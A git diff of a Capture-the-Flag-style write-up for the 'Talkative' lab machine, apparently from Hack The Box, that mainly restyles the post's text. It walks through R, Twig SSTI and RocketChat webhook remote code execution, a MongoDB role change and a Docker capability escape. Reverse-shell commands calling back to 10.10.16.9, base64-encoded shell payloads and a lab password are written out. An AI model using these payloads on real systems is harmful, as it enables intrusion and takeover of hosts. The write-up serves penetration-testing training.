@@ -7,22 +7,22 @@ published: false
 ![](/assets/Talkative/Talkative.png)
 
 ## Summary
-- Talkative is a Linux box with a really long chain of exploitation between several containers to finally crack the host.
-- The intial foothold is on an analytics web app called Jamovi that was on port 8080. It had a module called "RJ Editor" which gave us access to run system commands using the R language.
-- After using an R reverse shell, we get on that app's container as `root`.
-- In `/root`, found an archive that contained passwords for 3 users: `matt`, `janit` and `saul`.
-- We attempted to break out of this container to get on the host but didn't find a way to do that.
-- We also uploaded an `nmap` binary to scan our subnet. With it, we found the host's IP address but it didn't have its SSH port exposed.
-- Having run out of options, we reused the passwords on the Bolt CMS instance on port 80, we could log in with `saul`'s password but as the `admin` user.
-- Because Bolt CMS used the Twig PHP template engine, we were able to execute an SSTI payload for another RCE to obtain a shell as `www-data` on the Bolt CMS container.
-- We transferred a binary for `nmap` to that container so we can scan our subnet. we found many hosts with port 80 open, but two ones stuck out with ports 22 for SSH and 27017 for MongoDB.
-- We could gain access to the first host through SSH when we used `saul`'s credentials from before. Note: access to SSH was only available from within that container as the port was filtered from the outside.
-- And to reach Mongo, we set up `chisel` to forward any connections from our Kali to that port. We could log in to that database without authentication.
-- That DB instance belonged to the Rocket Chat application that was on port 3000. After registering our own user, we modified our privileges by altering the users collection on Mongo to become an administrator.
-- With that privilege, we accessed the admin interface and were able to get a third RCE using JavaScript webhooks as `root` on the rocket chat application container.
-- To finally root the box, we exploit the capabilities granted to our container to get privileged read and write access on the host.
-- We could exploit the `cap_dac_read_search` capability to read `/etc/shadow` and `root.txt`.
-- But, to fully own the box, we abuse the `cap_dac_override` capability to write our SSH public key into `/root/.ssh/authorized_keys` and get a `root` shell (this is using the 2nd container since it had the SSH client).
+- **Talkative** is a **Linux** box with a **long chain of exploitation** that went ***through several containers*** to finally crack the host.
+- The **intial foothold** is through **an analytics web app** called **Jamovi** that was on **port 8080**. It had a **plugin called "RJ Editor"** which allowed us to **run system commands** using **the R language.**
+- ***With an R reverse shell,*** we **got on that application's container** as `root`.
+- We attempted to **break out of it** and **get on the host** but couldn't find a way to do that.
+- *In that docker's* `/root` *directory,* we **found an archive** called `Bolt-Administration` which **contained 3 sets of credentials.**
+- We **reused the passwords** we found on the **Bolt CMS instance** on **port 80** and **could log in** as `admin`
+- *Because Bolt CMS used the* **Twig PHP template engine**, we were able to **abuse it** to **obtain RCE** via **Server-Side Template Injection (SSTI).**
+- We got a shell as `www-data` within **the Bolt container**. *And from it,* we could `SSH` to the host **using the credentials we found** (port 22 was filtered from the outside).
+- *On the host,* we **uploaded a standalone version of** `nmap` and did a **full port scan** on **all the hosted docker instances.**
+- **One of the containers** had **port 27017 open** which is the **default port for MongoDB.**
+- We set up `chisel` to **forward any connections** from our Kali to that port. And **could access the Mongo database** *through the tunnel* ***without authentication***.
+- *While checking Mongo,* we **found the database for RocketChat** which we could alter.
+- *To abuse it,* we **registered a user** through the RocketChat web application and **changed our role to** `admin` with a NoSQL update statement.
+- We could **obtain RCE** through the app by **creating an Integration** for an **incoming web hook** that **ran server-side JavaScript** when triggered.
+- *After getting* ***a reverse shell on the RocketChat container*** *as* `root`, we **installed a few dependencies** to **detect dangerous capabilities.**
+- We found the `cap_dac_read_search` and `cap_dac_override` capabilities and **exploited them** to **write an SSH public key** over the host's `/root/.ssh/authorized_keys` file then **used the private key to SSH to it** as `root`.
 
 ---
 
@@ -96,333 +96,339 @@ PORT     STATE    SERVICE VERSION
 |_http-server-header: TornadoServer/5.0
 ```
 
-`nmap` gives us a lot of ports to check out: 80, 3000 and 8080 through 8082. SSH is there but filtered which suggest it's closed off by a firewall or something.
+`nmap` gives us **a lot of ports** to check out: **80, 3000 and 8080 through 8082**. **SSH** is there but *filtered* which suggest it's closed off by a firewall or something.
 
-- Port 80 redirects to `http://talkative.htb` so we have a host name to add to our `/etc/hosts` file and we would be wise to search for other vhosts.
-- Port 3000 seems to be a web application.
-- Port 8080 has an `http-title` of jamovi which seems interesting.
-- Ports 8081 and 8082 give a `404 - Not Found` but there might be more to them.
-- And Lastly, all 808X ports are hosted on a different web server called Tornado httpd with a version of 5.0 (we should check if it's vulnerble)
+- **Port 80** redirects to `http://talkative.htb` so we have **a host name** to add to our `/etc/hosts` file and we might want to **search for other vhosts.**
+- **Port 3000** seems to be a **web application.**
+- **Port 8080** has **Jamovi** as a title which seems interesting.
+- **Ports 8081 and 8082** give a `404 - Not Found`. there might be more to them.
+- *And Lastly,* **all 808X ports** are hosted on a **different type of web server** called **"Tornado httpd"** with a version of 5.0 (we could check if it's vulnerble)
 
 ## Checking Out Port 80
-After modifying the `/etc/hosts` file with the `talkative.htb` hostname, we visit the website:
+*After modifying the* `/etc/hosts` *file with the* `talkative.htb` *hostname*, we visit the website:
 
 ![](/assets/Talkative/Port-80-wappalyzer.jpg)
 
-Wappalyzer shows us it's running Bolt CMS and PHP as its server-side language. Good to know.
+**Wappalyzer** shows us it's running **Bolt CMS** and **PHP as its server-side language**. Good to know.
 
-We also find a list of usernames there:
+we also find a **list of usernames** there:
 
 ![](/assets/Talkative/port-80-usernames-and-links.jpg)
 
-Each one's "Read More" link takes us to another page with his email in it:
+each user's **"Read More"** link takes us to **another page with his email in it**:
 
 ![](/assets/Talkative/janit-user-mail.jpg)
 
-So we end up with 3 users
+we get 3 usernames/emails:
 
-1. Janit Smith - janit@talkative.htb
-2. Saul Goodman - saul@talkative.htb
-3. Matt Williams - matt@talkative.htb
+1. **Janit Smith** [janit@talkative.htb]
+2. **Saul Goodman** [saul@talkative.htb]
+3. **Matt Williams** [matt@talkative.htb]
 
-We also find references to products
+*Down at the bottom,* we also find **references to 3 products**
 
 ![](/assets/Talkative/port-80-products.jpg)
 
 ### 1. TALKZONE
+the first one was *a bit vague*
 
 ![](/assets/Talkative/port-80-talkzone.jpg)
 
 ### 2. TALKFORBIZ (Coming Soon)
 
-this one talks about RocketChat
+this one talked about an application called **"RocketChat"** where it's **free to register** an account.
 
 ![](/assets/Talkative/port-80-talkforbiz-rocket-chat-hint.jpg)
 
 ### 3. TALK-A-STATS (Coming Soon)
 
-and this one mentioned Jamovi and links to it on the bottom
+**Jamovi** is mentioned here as well as **a link to it.**
 
 ![](/assets/Talkative/port-80-talkastats.jpg)
 
-But apart from that, it's not much here to played with. So we move on..
+*But apart from that,* **there wasn't much here** to played with. So we moved on..
 
 ## Checking Port 3000
 
-Over port 3000, we find the homepage for RocketChat. It allowed registration.
+*Over port 3000,* we found **the homepage for RocketChat**. It indeed **allowed registration** as mentioned above.
 
 ![](/assets/Talkative/port-3000-rocket-registration.jpg)
 
-We could register with the email as `test@talkative.htb` other domains weren't accepted.
+We **could register** with `test@talkative.htb`. Trying other domains like `@test.com` didn't work.
 
-The Channels area had one channel: General which didn't include much information.
+The **"Channels"** area had one channel: **"#general"**. There wasn't any information there.
 
 ![](/assets/Talkative/port-3000-empty-chat.jpg)
 
-Before diving any deeper into fingerprinting and perhaps exploit search, we decide to first take a quick look on Jamovi.
+*Before diving any deeper here, ex:* ***fingerprinting the web app's version*** *and* *searching for exploits,* we decided to first **take a quick look on Jamovi**.
 
-## Jamovi
+## The Jamovi Web App and Container
 
-The home page had an indicator of a vulnerability.
+The home page had **an indicator of a vulnerability.**
 
 ![](/assets/Talkative/jamovi-first-look.jpg)
 
-There was the "R" icon which had a drop-down menu containing the "RJ Editor" module.
+*On the toolbar above,* there was **an "R" icon** which had a drop-down menu. It had something called **"RJ Editor".**
 
 ![](/assets/Talkative/jamovi-rj-editor.jpg)
 
-So we checked it out.
+*When checking it out,* it seemed like **a web console** where we could **run code.**
 
 ![](/assets/Talkative/jamovi-rj-editor-code.jpg)
 
-A little background:
+**"R"** is a **programming language** commonly used for **statistics-related stuff**. ***But can we abuse it?***
 
-"R" is a programming language commonly used for statistics-related stuff. And it seems we have the ability to run it from this web console.
-
-we searched google for "r reverse shell"
+we searched **Google** for **"r reverse shell"**
 
 ![](/assets/Talkative/search-r-reverse-shell.jpg)
 
-and got back this [Github gist](https://gist.github.com/trietptm/05f385df4d2d8c0ee35b217e7307e462)
+and found this [Github gist](https://gist.github.com/trietptm/05f385df4d2d8c0ee35b217e7307e462) as the first result
 
 ![](/assets/Talkative/r-reverse-shell-gist.jpg)
 
-using it gave us a reverse shell as `root`
+it got us **a shell** as `root`
 
 ![](/assets/Talkative/jamovi-container-rooted.jpg)
 
-Because the shell we had wasn't that great, we used it to get proper one with `python` xD
+*the first thing we noticed after getting in,* was **being in a container.**
 
-```bash
-export RHOST="10.10.16.9"
-export RPORT=9000
-python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
-```
-
-the first thing we noticed after getting inside, was being in a container.
+we could tell from the `.dockerenv` file in the system root.
 
 ![](/assets/Talkative/jamovi-container.jpg)
 
-### Finding Creds in the Jamovi Docker
+### Finding Creds in the Root User's Directory
 
-In `/root`, we found an interesting file: `bolt-administration.omv`
+*In* `/root`, we found **an interesting file:** `bolt-administration.omv`
 
 ![](/assets/Talkative/jamovi-container-root-dir.jpg)
 
-But since the `unzip` utility wasn't found on the docker, we used a bash trick commonly-used in reverse shells to transfer it back to our Kali
+*But since the* `unzip` *utility wasn't there on the docker,* we used a **bash trick** -*commonly-used in reverse shells*- to **transfer it back** to our Kali.
 
 ![](/assets/Talkative/file-transfer-without-nc.jpg)
 
-Having verified the file's integrity using `md5sum`, we unzipped the archive:
+*Having* ***verified the file's integrity*** *using* `md5sum`, we **unzipped the archive**.
 
 ![](/assets/Talkative/unzipping-bolt-archive.jpg)
 
-the `xdata.json` file had the kind of loot we were looking for :D
+the `xdata.json` file within had the ***kind of loot we were looking for :D***
 
 ![](/assets/Talkative/bolt-archive-loot.jpg)
 
-from the file's name, we know the creds inside should work for the bolt instance. but before that, we make a couple of important checks:
+*from the file's name,* we know that **the creds inside should work for Bolt.**
 
-### Scanning our subnet and attempting to reach the host
+*but before taking that route,* we must first do **a couple of important checks.**
 
-right now, we need to check if we can reach the host spawning our docker. if it has SSH port open, we will try to reuse the creds we found there.
+### Check #1: Scanning our Subnet and Attempting to Reach the Host
 
-we will get our container's IP first using `hostname -i`
+we need to **discover the Container Environment** and see if we can **reach the host** spawning our docker.
+
+*if the host* ***exposed its SSH port*** *to our container,* we could try **reusing the creds** we found there.
+
+we will first **get our docker's IP** using `hostname -i`
 
 ![](/assets/Talkative/jamovi-container-ip.jpg)
 
 we're at `172.18.0.2`.
 
-Usually the host sits at the first IP of the subnet `172.18.0.1`. But we can't confirm with `ping` or `ssh` to it because neither of those tools are installed :/
+*Usually,* the host **holds the first IP** on the subnet (*here,* that would be `172.18.0.1`).
+
+*To confirm this,* we needed either `ping` or `ssh`. but ***neither was available :/***
 
 ![](/assets/Talkative/jamovi-container-no-ping-no-ssh-client.jpg)
 
-To check the open ports on the host as well as enumerate this subnet, we're going to upload an [nmap standalone binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) which we found on Github.
+A **handy tool** here would be `nmap`. we're going to upload a [Standalone Binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) for it to our container.
 
-we use the same bash tricks we used earlier but in the opposite direction this time
+*For the transfer,* we used the **same bash tricks** as earlier but *in the opposite direction* this time.
 
 ![](/assets/Talkative/jamovi-container-transfer-nmap.jpg)
 
-then run a quick network discovery
+we ran **a quick network discovery** with `-sn` and **increased the rate** with `--min-rate` and `-T4` for speed
 
 ![](/assets/Talkative/jamovi-container-network-discovery.jpg)
 
-we find the `172.18.0.1` host up. so we go ahead and run a full port scan.
+we **only found** the `172.18.0.1` host up.
 
-but we find a missing file `/etc/services` required. but we get it from our kali and proceed.
+*Next,* we ran a **full port scan** against it.
+
+*but to do that,* `nmap` needed a file (`/etc/services`) that was missing.
+
+that file **was there on our Kali**. so we got it and re-ran `nmap`.
 
 ![](/assets/Talkative/jamovi-container-no-ssh-to-host.jpg)
 
-we find SSH port filtered :/
+the **SSH port was filtered**. ***Still worth it though :)***
 
-the remaining ports are already exposed from outside. so we move on..
+the **remaining ports** were *already exposed from outside*. so we moved on..
 
-### Attempting to escape our container
+### Check #2: Attempting to Escape our Container
 
-Because we had `root` privilege, it was worth it to run a tool like [deepce.sh](https://github.com/stealthcopter/deepce) to try and break out of our docker.
+*Because we had the* `root` *privilege*, it was also worth it to run a tool like [deepce.sh](https://github.com/stealthcopter/deepce) to **try and break out of our docker onto the host.**
 
 ![](/assets/Talkative/jamovi-deepce-sh.jpg)
 
-The capability we found: `cap_dac_override` isn't dangerous on its own. it requires the `cap_dac_read_search` with it to get us out of the container.
+The **capability** we found: `cap_dac_override` wasn't dangerous on its own.
 
-Having run out of options, we're going to pay Bolt a visit :)
+It required the `cap_dac_read_search` with it to ***enable a Docker escape.***
+
+*Having* **checked the above shorcuts** *and found them closed,* we can now ***safely pay Bolt a visit without looking back :)***
 
 ## Reusing Creds on Bolt and Exploiting it for RCE
 
-To find bolt's login page, we searched Google with "bolt admin login".
+*To find bolt's login page,* we **searched Google:** "bolt admin login".
 
-We got back the [Official Documentation Page](https://docs.boltcms.io/5.0/manual/login)
+we found the [Official Documentation Page](https://docs.boltcms.io/5.0/manual/login)
 
-according to it, the `/bolt` web directory should lead us to the login page. And it does:
+*according to it,* the `/bolt` web directory **contains the login page.**
 
 ![](/assets/Talkative/bolt-login-page.jpg)
 
-After trying all the names we have (`janit`, `saul`, `matt`) as usernames and their emails ('`<USER>@talkative.htb`') with all the passwords, we didn't log in.
+Trying **all the usernames** and **emails** with **all the passwords** didn't get us in.
 
-However, trying the `admin` username worked with matt's password: `jeO09ufhWD<s`
+*However,* trying the `admin` username worked with `jeO09ufhWD<s` (`matt`*'s password*).
 
-Looking around for RCE venues, we tried to upload a PHP reverse shell since bolt ran it server-side.
+*Looking around for RCE venues,* we tried to **upload a PHP reverse shell** since Bolt ran it server-side.
 
-But that file type wasn't allowed.
+But **that file type wasn't allowed.**
 
 ![](/assets/Talkative/bolt-fail-to-upload-php.jpg)
 
-And, editing the config file wasn't an option either.
+And **editing the config file** wasn't an option either.
 
 ![](/assets/Talkative/bolt-cant-edit-config-file.jpg)
 
-However, since we can edit and upload `.twig` files, we have a chance to execute code through Server-Side Template Injection (SSTI).
+*However, since the* `.twig` *file extension was allowed,* we had a chance to **execute code** through **Server-Side Template Injection (SSTI).**
 
-That's because Twig is a template engine for PHP and essentially enables us to evaluate PHP code.
+*because* **Twig** *is a* **template engine for PHP**, it essentially **enables us to run server-side code.**
 
-To exploit that, we go to "File Management" > "View & edit templates"
+*To proceed,* we went to **"File Management"** > **"View & edit templates"**
 
 ![](/assets/Talkative/bolt-view-edit-templates.jpg)
 
-We choose the "base-2021" theme becuase it's likely the one in use. then choose `index.twig`
+We **chose the "base-2021" theme** since it was the one *likely in use* then selected `index.twig` for editing.
 
 ![](/assets/Talkative/bolt-index-twig-writable.jpg)
 
-it seems writable, we should be good to go.
-
-Next, we insert a standard SSTI payload from [PayloadAllTheThings Github Repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig)
-
-```
-{{7*'7'}}
-```
+*it looked writable,* so we next **inserted a standard SSTI payload** from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig) Github Repo
 
 ![](/assets/Talkative/bolt-basic-ssti-payload.jpg)
 
-This should reflect the number 49 in the home page.
+*After saving,* this payload was **expected to reflect** on the home page.
 
-But it doesn't take effect unless we use the "Clear the cache" functionality under the "Maintenance" section:
+But that **change didn't take effect** until we **"Cleared the Cache"** from the option under the **"Maintenance"** section.
 
 ![](/assets/Talkative/bolt-clear-the-cache-feature.jpg)
 
+the **number 49** appeared at the **top right corner** of the page.
+
 ![](/assets/Talkative/bolt-ssti-execution-confirmed.jpg)
 
-Having confirmed code execution, we switch up to a base64-encoded bash reverse shell payload:
+*Having* ***confirmed code execution,*** we switched to a **base64-encoded bash reverse shell** payload:
 
-```php
-{{['echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ== | base64 -d | bash']|filter('system')}}
-```
+![](/assets/Talkative/bolt-ssti-bash-reverse-shell.jpg)
 
-which decodes to/should run:
+**which is**:
 
 ```bash
 bash -i >& /dev/tcp/10.10.16.9/9000 0>&1
 ```
 
-![](/assets/Talkative/bolt-ssti-bash-reverse-shell.jpg)
-
-with another cache clear and a visit to the home page, we get a shell back as `www-data`
+*with another cache clear and a visit to the home page,* we **get back a shell** as `www-data`
 
 ![](/assets/Talkative/bolt-ssti-shell-access.jpg)
 
-## Enumerating the Docker Environment and Reaching the Host
+## Enumerating the 2nd Container Subnet and Reaching the Host
 
-Listing the contents of the system root shows us we are also in a Docker container with an IP of `172.17.0.13`
+**Listing the contents of the system root** showed us we were now in **another Docker container** but with a **different IP** of `172.17.0.13`
 
 ![](/assets/Talkative/bolt-docker-ip.jpg)
 
-which is in a different subnet from the Jamovi container which was in `172.18.0.0/24`
+This was a **different subnet** from the **Jamovi** container's (`172.18.0.0/24`).
 
-To check out this subnet, we're going to do the same thing as we did before.
-
-We upload it to the Bolt container using `curl` and a Python HTTP server (port 80 didn't work here so we used 8000)
+***to discover this area,*** we're going to do **the same thing as before:** use `nmap`
 
 ![](/assets/Talkative/bolt-docker-getting-nmap.jpg)
 
-then run a quick host discovery over the `172.17.0.0/24` subnet
+*after transferring it,* we run **a host discovery** over the `172.17.0.0/24` subnet
 
 ![](/assets/Talkative/bolt-docker-nmap-discovery.jpg)
 
-We discovered a LOT of live devices there (from `172.17.0.1` all the way up to `172.17.0.19`)
+we found **a LOT of live devices** there (*from* `172.17.0.1` *all the way up to* `172.17.0.19`)
 
-We've been wanting to try the creds we found on the host's SSH port from the Jamovi container. But the port was also filtered.
+we've been wanting to **try the creds** we found **on the host's SSH port**. *But it was always filtered.*
 
-However, we found the `ssh` client installed on this one and found the port accessible.
+*However, on this container,* we found the **SSH client installed** which was interesting.
+
+we tried to **connect to the host** as `root`:
 
 ![](/assets/Talkative/bolt-docker-try-ssh-to-host.jpg)
 
-the set of creds that worked were `saul`'s username and `matt`'s password again `jeO09ufhWD<s`
+*After a couple of tries,* the **set of creds** that worked were:
+```
+saul
+jeO09ufhWD
+```
 
 ![](/assets/Talkative/ssh-as-saul.jpg)
 
 ## Finding RocketChat's MongoDB Instance and Altering it
 
-Running a privesc script here didn't yield any results. but there were plenty of docker instances running that looked interesting:
+*Trying to privesc,* we ran [linpeas](https://github.com/carlospolop/PEASS-ng) here. But we **didn't find a way** to `root`.
+
+*but, when looking at* **the system processes,** we noticed **plenty of docker instances** running:
 
 ![](/assets/Talkative/host-enumerating-docker-processes.jpg)
 
-- Most of the ports were 80.
-- There was one for 3000 which is probably for RocketChat. That's a container we haven't touched.
-- There were other high ports that we wanted to check.
+- **Most of the ports** were 80.
+- There was **one for 3000** which was **probably RocketChat**. A container we haven't touched.
+- There were **other high ports** that we wanted to check.
 
-But to sure we're not missing any other ports, we uploaded `nmap` and ran a full port scan over the entire `172.17.0.2-19` IP range.
+***But to be sure we weren't missing any other ports,*** we uploaded `nmap` a 3rd time and ran a **full port scan** over the entire `172.17.0.2-19` IP range.
 
-And we did find something very interesting:
+And we **did find something very interesting.**
 
 ![](/assets/Talkative/host-mongo-db-discovered.jpg)
 
-port 27017 is usually for MongoDB. which is known for having no authentication by default.
+**Port 27017** is the **default port for MongoDB**. which is **known for having no authentication** *by default.*
 
-we will to forward traffic from our kali to reach that port on the `172.17.0.2` host.
+*to reach that port on the* `172.17.0.2` *host,* we will need **some Port Forwarding magic.**
 
-[chisel](https://github.com/jpillora/chisel) is a nice choice for its ease-of-use. we upload it back on the bolt container.
+[Chisel](https://github.com/jpillora/chisel) is a **nice choice** for its **ease-of-use**.
 
-and create a tunnel to mongo.
+we **upload it** to the bolt container and **create a tunnel to Mongo.**
 
 ![](/assets/Talkative/tunneling-and-reaching-mongodb.jpg)
 
-Having authenticated without any credentials, we enumerate the database:
+*Having authenticated without any credentials,* we could **enumerate the database**
 
 ```bash
 # listing the databases
 show dbs
 # using the meteor database
 use meteor
-# show collections in that database (equivaled to tables in MySQL)
+# showing collections within the meteor db (equivaled to tables in MySQL)
 show collections
 ```
 
-we find a collection called users which had interesting stuff:
+*among the various collections,* we found one called **"users"** which had interesting stuff:
 
 ![](/assets/Talkative/saul-rockechat-user.jpg)
 
-this was the saul user's account, which had an admin role.
+we noticed `saul`'s account, which **had an admin role.**
 
-we tried to:
-1. login as him using the 3 passwords we found earlier, but none worked.
-2. use his ID and token as our cookies to impersonate him, that also didn't work
+***Trying to compromise it,*** we:
+1. **tried to login** using the **passwords we found earlier.** none worked.
+2. we also tried **cracking the bcrypt hash**. but without any luck.
+3. we **replaced that bcrypt hash** with one of our own. *still, for some reason,* **that change didn't reflect.**
+4. we even **used his ID and token as cookies** to impersonate him. but, **that also didn't work** :/
+
 ![](/assets/Talkative/using-saul-cookies-for-impersonation.jpg)
-3. we also tried cracking the bcrypt hash. but without any luck.
-4. we even replaced that bcrypt hash with one that we generated. But that change didn't reflect somehow.
 
-so, we chose to update our user's privileges in the database and grant him admin privileges instead :D
+***so, instead,*** we chose to **update our user's role** in the database to **grant him admin privileges :D**
+
+we ran the **NoSQL update statement** below to carry this out.
 
 ```javascript
-db.users.update( { _id : "voBu5qYu5ye3vDcw7"}, {
+db.users.update({ _id : "voBu5qYu5ye3vDcw7"}, {
 	$set: { 
 		roles: ["admin"]
 	}
@@ -431,26 +437,30 @@ db.users.update( { _id : "voBu5qYu5ye3vDcw7"}, {
 
 ![](/assets/Talkative/mongo-grant-admin-role.jpg)
 
+it **ran without problems**. we confirmed this with another query.
+
 ![](/assets/Talkative/mongo-admin-role-granted.jpg)
 
-after relogging, we could now access RocketChat as an administrator at `/admin`
+*after relogging,* we could now **access RocketChat's administrator interface** at `/admin`
 
 ![](/assets/Talkative/rocket-chat-logged-in-as-admin.jpg)
 
-searching for exploits for that version (2.4.14) didn't get us anywhere.
+*Noticing the version,* we **searched for exploits** but *didn't get any results.*
 
-So, we probed the application for abusable functionalities.
-
-## Exploiting RocketChat's WebHooks for RCE
-Searching Google for ways to execute code using RocketChat's admin, we came across these results:
+## Exploiting RocketChat Integrations for RCE
+*While searching* ***Google*** *for ways to* ***execute code using RocketChat's admin,*** we came across a **couple of results.**
 
 ![](/assets/Talkative/rocket-chat-search-admin-rce.jpg)
 
-Inpecting the exploit on [Exploit-DB](https://www.exploit-db.com/exploits/50108) shows us that the Integration feature is used to run Javascript code to obtain RCE.
+*Checking the one on* [Exploit-DB](https://www.exploit-db.com/exploits/50108), We **looked closely** at the `rce` **function** within the **Python code.**
+
+it seemed that **RochetChat's Integration feature** was **being abused** to **run Javascript code server-side**. This is how **Remote Code Execution** was obtained.
 
 ![](/assets/Talkative/rocket-chat-rce-exploit-analysis.jpg)
 
-following the exploit's way of creating a payload, we create our own to execute a bash reverse shell instead of the `cmd` variable.
+*following the exploit's way of creating its payload,* we **created our own Integration** and **Incoming Web Hook** to **execute a bash reverse shell** instead of the `cmd` variable above.
+
+**Here's the code:**
 
 ```javascript
 const require = console.log.constructor('return process.mainModule.require')();
@@ -460,73 +470,77 @@ exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ== | base64 -d 
 
 ![](/assets/Talkative/rocket-chat-incoming-webhook-setup.jpg)
 
-Once, we've saved the changes, we copy the `curl` command over and use it to trigger the webhook after starting our `ncat` listener:
+*After* ***filling out all the fields*** *similar to what the exploit did,* we **saved the changes.**
+
+we then **copied** the `curl` command
 
 ![](/assets/Talkative/rocket-chat-obtaining-the-webhook-url.jpg)
 
-getting a sweet root shell on the RocketChat container.
+and used it to **trigger the webhook** after starting our `ncat` listener in advance.
 
 ![](/assets/Talkative/rocket-chat-curling-the-webhook-url.jpg)
 
+we got a **sweet** `root` **shell** on the **RocketChat container :D**
+
 ## Escaping and Owning the Host (Finally)
-right after geting our shell, we improve it using the `script` utility to provide a pty.
+*After getting in,* we **improved our shell** using the `script` utility to **get a pty.**
 
 ![](/assets/Talkative/rocket-chat-container-improving-the-shell.jpg)
 
-Right away, we transfer `deepce.sh` and run it to check for ways to escape to the host.
+we then **transfered** the `deepce.sh` script and **ran it** to **check for ways to escape to the host.**
 
-However, it couldn't enumerate capabilities because the `capsh` tool wasn't installed.
+*because the* `capsh` *tool wasn't installed,* the script **couldn't enumerate the docker's capabilities.**
 
 ![](/assets/Talkative/rocket-container-no-capsh-installed.jpg)
 
-Capabilities are one of the main ways to escape Docker. so we have to install that tool.
+*since* ***capabilities are one of the main ways to escape containers,*** we **had to install the missing items.**
 
-we `cat` the `/etc/os-release` file to know our Linux distro.
+we `cat` the `/etc/os-release` file to **get our Linux distro.**
 
 ![](/assets/Talkative/rocket-container-linux-distro.jpg)
 
-We're on Debian 10, so we search Google to find out how to install `capsh`
+we were on **Debian 10.** so we searched **Google** to find out how to install `capsh`
 
-The first results was [This website](https://command-not-found.com/capsh)
+The **first result** was from a website called [command-not-found.com](https://command-not-found.com/capsh). such ***a suitable name :)***
 
 ![](/assets/Talkative/rocket-container-finding-capsh-dependencies-1.jpg)
 
-it showed that we needed the `libcap2-bin` library.
+*according to it,* we needed the `libcap2-bin` library.
 
-we obtained it from [Debain packages site](https://packages.debian.org/sid/amd64/libcap2-bin/download)
+we **could obtain it** from the [Debain packages](https://packages.debian.org/sid/amd64/libcap2-bin/download) site
 
-but it had another requirement: `libcap2`
+*but during installation,* it **required another library**: `libcap2`
 
 ![](/assets/Talkative/rocket-container-finding-capsh-dependencies-2.jpg)
 
-we got it the same way from [here](https://packages.debian.org/sid/amd64/libcap2/download) and installed it using `dpkg`
+we got it the same way from [here](https://packages.debian.org/sid/amd64/libcap2/download) and installed it using `dpkg -i`
 
-Having installed the required dependencies, we ran `deepce.sh` a second time:
+***having installed the required dependencies,*** we ran `deepce.sh` a second time:
 
 ![](/assets/Talkative/rocket-chat-container-capabilities-discovered.jpg)
 
-This time, we find a set of critical capabilities. Namely `cap_dac_read_search` and `cap_dac_override` which together can be exploited to write files to the host machine.
+we found a **set of critical capabilities**. Namely `cap_dac_read_search` and `cap_dac_override` which **together can be exploited to write files to the host machine.**
 
-We're going to follow the method explained in the awesome [HackTricks Page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override) and compile the C code.
+We're going to **follow the method explained** in the [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override) page and **compile the C code.**
 
-we're going to staticly link the binary to make sure it has everything it needs.
+**Note:** ***staticly linking the binary*** with the `-static` flag will **make sure it has the libraries** it needs.
 
 ![](/assets/Talkative/privesc-compile-shocker-write.jpg)
 
-and generate an SSH key pair so we can write it to the root user's `.ssh` directory.
+the **warnings weren't a concern** here. we still **got the compiled executable.**
+
+*To compromise the host,* we first **generated an SSH key pair.**
 
 ![](/assets/Talkative/privesc-generating-ssh-key-pair.jpg)
 
-after transferring the public key, we write it over the host's root user `authorized_keys` file.
+we then **transferred the public key** and **used the exploit** to **write it over** the host's `/root/.ssh/authorized_keys` file.
 
 ![](/assets/Talkative/privesc-writing-ssh-public-key-to-host.jpg)
 
-which was a success!
+**which was a success!**
 
-to finish out the box, we transferred the private key to the bolt container (since it had the `ssh` client installed).
-
-and used it to own the box at last :D
+The **final step** was to **transfer the private key to the bolt container** (*since it had the* `ssh` *client installed*) and use it to **own the box.**
 
 ![](/assets/Talkative/privesc-rooted-finally.jpg)
 
-What a trip! XD
+**What a trip! :D**
